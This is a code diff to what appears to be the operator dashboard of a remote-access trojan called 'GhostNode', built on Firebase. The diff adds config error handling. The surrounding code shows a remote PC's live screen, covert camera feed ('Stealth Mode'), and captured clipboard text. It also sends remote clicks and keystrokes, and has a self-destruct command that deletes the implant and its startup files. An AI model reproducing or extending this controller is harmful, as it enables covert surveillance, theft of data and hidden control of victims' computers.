@@ -99,97 +99,108 @@
         import { getFirestore, doc, onSnapshot, collection, addDoc, serverTimestamp, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
 
-        const firebaseConfig = JSON.parse(__firebase_config);
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        const auth = getAuth(app);
+        // ERROR FIX: Check if __firebase_config exists, else use a default check or null
+        let firebaseConfig;
+        try {
+            firebaseConfig = JSON.parse(typeof __firebase_config !== 'undefined' ? __firebase_config : '{}');
+        } catch (e) {
+            console.error("Firebase config missing or invalid.");
+            firebaseConfig = {}; 
+        }
+
         const appId = typeof __app_id !== 'undefined' ? __app_id : 'sainfoxiya-com-a7733';
 
-        let user = null;
+        // Only initialize if config is valid
+        if (firebaseConfig.apiKey) {
+            const app = initializeApp(firebaseConfig);
+            const db = getFirestore(app);
+            const auth = getAuth(app);
+            let user = null;
 
-        // --- AUTH ---
-        async function init() {
-            try {
-                const res = await signInAnonymously(auth);
-                user = res.user;
-                setupListeners();
-            } catch (err) {
-                console.error("Auth Error:", err);
+            // --- AUTH ---
+            async function init() {
+                try {
+                    const res = await signInAnonymously(auth);
+                    user = res.user;
+                    setupListeners(db, auth);
+                } catch (err) {
+                    console.error("Auth Error:", err);
+                }
             }
-        }
-        init();
+            init();
 
-        function setupListeners() {
-            if(!user) return;
-
-            // 1. Screen Monitor
-            onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_screen'), (snap) => {
-                if(snap.exists()) {
-                    const data = snap.data();
-                    const screenImg = document.getElementById('live-screen');
-                    const cursor = document.getElementById('remote-cursor');
-                    
-                    if(data.frame) screenImg.src = data.frame;
-                    cursor.style.left = (data.cursorX * 100) + '%';
-                    cursor.style.top = (data.cursorY * 100) + '%';
-                }
-            });
-
-            // 2. Camera Monitor
-            onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_camera'), (snap) => {
-                if(snap.exists()) {
-                    const data = snap.data();
-                    const camImg = document.getElementById('live-camera');
-                    const placeholder = document.getElementById('cam-placeholder');
-                    const box = document.getElementById('cam-box');
-                    const dot = document.getElementById('cam-dot');
-                    const txt = document.getElementById('cam-txt');
-                    const msg = document.getElementById('cam-status-msg');
-
-                    if(data.frame && !data.motion) {
-                        camImg.src = data.frame;
-                        camImg.classList.remove('hidden');
-                        placeholder.classList.add('hidden');
-                        dot.className = "w-1.5 h-1.5 bg-green-500 rounded-full";
-                        txt.innerText = "Live";
-                        box.classList.remove('motion-alert');
-                    } else {
-                        camImg.classList.add('hidden');
-                        placeholder.classList.remove('hidden');
-                        dot.className = "w-1.5 h-1.5 bg-red-600 rounded-full";
-                        txt.innerText = data.motion ? "Motion" : "Off";
-                        msg.innerText = data.motion ? "Stealth Mode: Motion Detected" : "Waiting for Permission";
-                        if(data.motion) box.classList.add('motion-alert');
-                        else box.classList.remove('motion-alert');
+            function setupListeners(db, auth) {
+                // 1. Screen Monitor
+                onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_screen'), (snap) => {
+                    if(snap.exists()) {
+                        const data = snap.data();
+                        const screenImg = document.getElementById('live-screen');
+                        const cursor = document.getElementById('remote-cursor');
+                        
+                        if(data.frame) screenImg.src = data.frame;
+                        cursor.style.left = (data.cursorX * 100) + '%';
+                        cursor.style.top = (data.cursorY * 100) + '%';
                     }
-                }
-            });
-
-            // 3. Clipboard Feed
-            const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'clipboard'), orderBy('timestamp', 'desc'), limit(12));
-            onSnapshot(q, (snap) => {
-                const container = document.getElementById('clipboard-list');
-                container.innerHTML = '';
-                snap.forEach(doc => {
-                    const log = document.createElement('div');
-                    log.className = "bg-slate-900/80 p-3 rounded-xl border border-white/5 text-[11px] font-mono break-all hover:border-blue-500/30 transition-all";
-                    log.innerText = doc.data().text;
-                    container.appendChild(log);
                 });
-            });
-        }
 
-        // --- ACTIONS ---
-        window.sendCommand = async (type, extra = {}) => {
-            if(!user) return;
-            await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'actions'), {
-                type, ...extra, timestamp: serverTimestamp()
-            });
-        };
+                // 2. Camera Monitor
+                onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'streams', 'live_camera'), (snap) => {
+                    if(snap.exists()) {
+                        const data = snap.data();
+                        const camImg = document.getElementById('live-camera');
+                        const placeholder = document.getElementById('cam-placeholder');
+                        const box = document.getElementById('cam-box');
+                        const dot = document.getElementById('cam-dot');
+                        const txt = document.getElementById('cam-txt');
+                        const msg = document.getElementById('cam-status-msg');
+
+                        if(data.frame && !data.motion) {
+                            camImg.src = data.frame;
+                            camImg.classList.remove('hidden');
+                            placeholder.classList.add('hidden');
+                            dot.className = "w-1.5 h-1.5 bg-green-500 rounded-full";
+                            txt.innerText = "Live";
+                            box.classList.remove('motion-alert');
+                        } else {
+                            camImg.classList.add('hidden');
+                            placeholder.classList.remove('hidden');
+                            dot.className = "w-1.5 h-1.5 bg-red-600 rounded-full";
+                            txt.innerText = data.motion ? "Motion" : "Off";
+                            msg.innerText = data.motion ? "Stealth Mode: Motion Detected" : "Waiting for Permission";
+                            if(data.motion) box.classList.add('motion-alert');
+                            else box.classList.remove('motion-alert');
+                        }
+                    }
+                });
+
+                // 3. Clipboard Feed
+                const q = query(collection(db, 'artifacts', appId, 'public', 'data', 'clipboard'), orderBy('timestamp', 'desc'), limit(12));
+                onSnapshot(q, (snap) => {
+                    const container = document.getElementById('clipboard-list');
+                    container.innerHTML = '';
+                    snap.forEach(doc => {
+                        const log = document.createElement('div');
+                        log.className = "bg-slate-900/80 p-3 rounded-xl border border-white/5 text-[11px] font-mono break-all hover:border-blue-500/30 transition-all";
+                        log.innerText = doc.data().text;
+                        container.appendChild(log);
+                    });
+                });
+
+                // Expose sendCommand to window
+                window.sendCommand = async (type, extra = {}) => {
+                    if(!auth.currentUser) return;
+                    await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'actions'), {
+                        type, ...extra, timestamp: serverTimestamp()
+                    });
+                };
+            }
+        } else {
+            console.warn("GhostNode: Firebase configuration not found. Use real deployment for live connection.");
+        }
 
         window.sendText = () => {
             const el = document.getElementById('key-input');
-            if(el.value.trim()) {
+            if(el.value.trim() && window.sendCommand) {
                 sendCommand('text', { value: el.value });
                 el.value = '';
             }
@@ -199,15 +210,17 @@
             const rect = e.target.getBoundingClientRect();
             const relX = (e.clientX - rect.left) / rect.width;
             const relY = (e.clientY - rect.top) / rect.height;
-            sendCommand('click', { relX, relY });
+            if (window.sendCommand) sendCommand('click', { relX, relY });
         };
 
         window.confirmSelfDestruct = () => {
             const modal = document.getElementById('destruct-modal');
             if(confirm("DANGER: This will delete the executable and all startup files on the remote PC. Connection will be lost forever. Proceed?")) {
-                sendCommand('self_destruct');
-                modal.classList.remove('hidden');
-                modal.classList.add('flex');
+                if (window.sendCommand) {
+                    sendCommand('self_destruct');
+                    modal.classList.remove('hidden');
+                    modal.classList.add('flex');
+                }
             }
         };
 
